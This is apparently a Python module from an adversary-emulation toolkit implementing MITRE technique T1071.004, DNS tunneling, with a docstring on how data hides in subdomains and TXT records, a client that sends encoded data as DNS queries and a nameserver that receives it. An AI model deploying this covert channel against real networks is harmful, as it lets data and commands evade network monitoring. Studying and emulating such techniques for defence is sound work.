"""Application Layer Protocol: DNS

Adversaries may communicate using the Domain Name System (DNS) application layer protocol 
to avoid detection/network filtering by blending in with existing traffic. 
Commands to the remote system, and often the results of those commands, 
will be embedded within the protocol traffic between the client and server.

The DNS protocol serves an administrative function in computer networking 
and thus may be very common in environments. 
DNS traffic may also be allowed even before network authentication is completed. 
DNS packets contain many fields and headers in which data can be concealed. 
Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems 
under their control within a victim network while also mimicking normal, expected traffic.

Mitre: `T1071.004 <https://attack.mitre.org/versions/v12/techniques/T1071/004/>`_


.. mermaid::

   sequenceDiagram
      participant C as Client
      participant S as DNS Nameserver
      Note left of C: Client information <br/> IP: 192.168.178.2 = MTkyLjE2OC4xNzguMg
      C->>S: DNS Request: <br/>Type: TXT <br/>MTkyLjE2OC4xNzguMg.example.com
      S-->>C:DNS Response: <br/>Type: TXT <br/> Code: NOERROR <data>


Useful packages for dns are:

#. `dnspython <https://github.com/rthalley/dnspython>`_

#. `nserver <https://github.com/nhairs/nserver>`_

#. `dnslib <https://github.com/paulc/dnslib>`_


.. note::
    A subdomain can have up to 63 characters. 
    This means that the data you can send can not be longer than 63 characters per subdomain.
    Note that this does't mean that you can't use multiple subdomains.
    But be aware that a domain has a maximum of 253 characters.

# https://stackoverflow.com/questions/10552665/names-and-maximum-lengths-of-the-parts-of-a-url

.. note::
    A TXT Records can have up to 255 characters. 
    There can be more than 255 characters by adding multiple strings together.
    
# https://support.google.com/a/answer/11613097?hl=en#:~:text=Most%20TXT%20records%20can%20have,with%20a%20255%2Dcharacter%20limit.

      
.. note::
    When sending data embedded in the URL it must be encoded in a URL safe manner. 
    Base64 can be used. 
    But be aware of the = and == padding characters.

    .. math:: \\lceil \\frac{n}{3} \\rceil


The following code implements a simple DNS Nameserver that can be used to receive the sent requests.

.. code:: python

    if __name__ == "__main__":
        # Client
        # dns_send("data.example.com")

        # Server
        def dummy(data):
            return f"response of: {data}"

        dns_factory(dummy).run()

"""

import logging
import dns.resolver as dnsr
# import dnslib
from nserver import TXT, NameServer

logger = logging.getLogger(__name__)

def dns_send(  # pylint: disable=W0102
    *args: str, address: list = ["127.0.0.1"], port=53
) -> str:
    """Takes (sub-)domain and assembles a FQDN.

    Args:
        *args (str): The (sub-)domains that are used to build the FQDN.
        address (list, optional): List of DNS-Nameserver IP's . Defaults to ["127.0.0.1"].
        port (int, optional): Port of DNS-Nameserver to send requests to. Defaults to 53.

    Returns:
        str: Answer of the DNS-Nameserver.
    """
    dns_resolver = dnsr.Resolver(configure=False)
    dns_resolver.nameservers = address
    dns_resolver.port = port
    res = dns_resolver.resolve(f"{'.'.join([*args])}", "TXT", tcp=False)
    result = ""
    for answers in res:
        for string in answers.strings:
            result += string.decode("ascii")
    return result


def dns_factory(
    func: callable, domain: str = "example.com", port: int = 53
) -> NameServer:
    """Return a DNS Nameserver according to the passed parameters.

    Supply a function that has one parameter.
    The passed argument is list of strings which represent the subdomains in a request.
    For example ["subsub", "sub"].

    example function:
        def dummy(data):
            return f'response of: {data}'

    Args:
        func (callable): A function containing the logic for a dns request.
            Its parameter takes a list of strings.
            Returns a string which is sent back to the client.

        domain (str, optional): The base domain which clients want to resolve.
            Defaults to "example.com".

        port (int, optional): The port to which a request is sent. Defaults to 53.

    Returns:
        NameServer: The NameServer.
    """

    name_server = NameServer("DNS-NameServer")

    @name_server.rule(f"{domain}", ["TXT"])  # only domain
    def main(query):
        # data = query.name.removesuffix(f"{domain}").split(".")    # would always return [""]
        response = func([""])
        return TXT(query.name, response)

    @name_server.rule(f"**.{domain}", ["TXT"])  # n subdomain
    def sub(query):
        data = query.name.removesuffix(f".{domain}").split(".")
        response = func(data)
        return TXT(query.name, response)

    name_server.settings.SERVER_ADDRESS = "0.0.0.0"
    name_server.settings.SERVER_PORT = port
    # ns.settings.SERVER_TYPE = "TCPv4"
    return name_server


if __name__ == "__main__":
    # client
    # dns_send("data.example.com")

    # server
    def dummy(data):
        return f"response of: {data}"

    dns_factory(dummy).run()
